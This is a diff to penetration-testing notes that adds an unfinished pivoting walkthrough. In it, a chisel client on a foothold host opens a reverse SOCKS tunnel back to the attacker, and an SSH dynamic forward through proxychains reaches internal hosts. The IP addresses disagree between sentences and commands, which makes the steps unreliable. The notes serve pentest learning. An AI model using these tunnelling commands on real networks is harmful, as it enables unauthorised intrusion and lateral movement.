@@ -235,6 +235,22 @@ The multiple IP's in the image represent different network interfaces.
     <img src="https://github.com/ToBeatELIT3/InfoSecNotes/blob/main/Methodology/Images/fig2.png">
 </details>
 
+Assume theres important services on ``172.8.0.9`` that we want to view. We need to create a socks proxy to ``172.14.0.5`` so that we can use a proxychain to access the services on ``172.8.0.9``. We have SSH access on ``172.12.0.4``.
+
+To start, we'd get a socks proxy on ``10.10.0.12``
+
+```bash
+tobeatelite@10.10.0.25 $ chisel server -p 1080 --reverse
+user@172.12.0.2 $ ./tmp/chisel client 10.10.0.25:1080 R:socks
+```
+And now we can get a socks proxy on ``172.14.0.3`` with ssh, tunneling through ``172.12.0.2``
+
+```bash
+proxychains -q -f config_1080.conf ssh -i id_rsa user2@172.12.0.4 -D 1081
+```
+
+<UNFINISHED CURRENTLY>
+
 **Scenario 2: Receive Revshell through 2 Hosts**
 <details>
     <summary>Visual</summary>
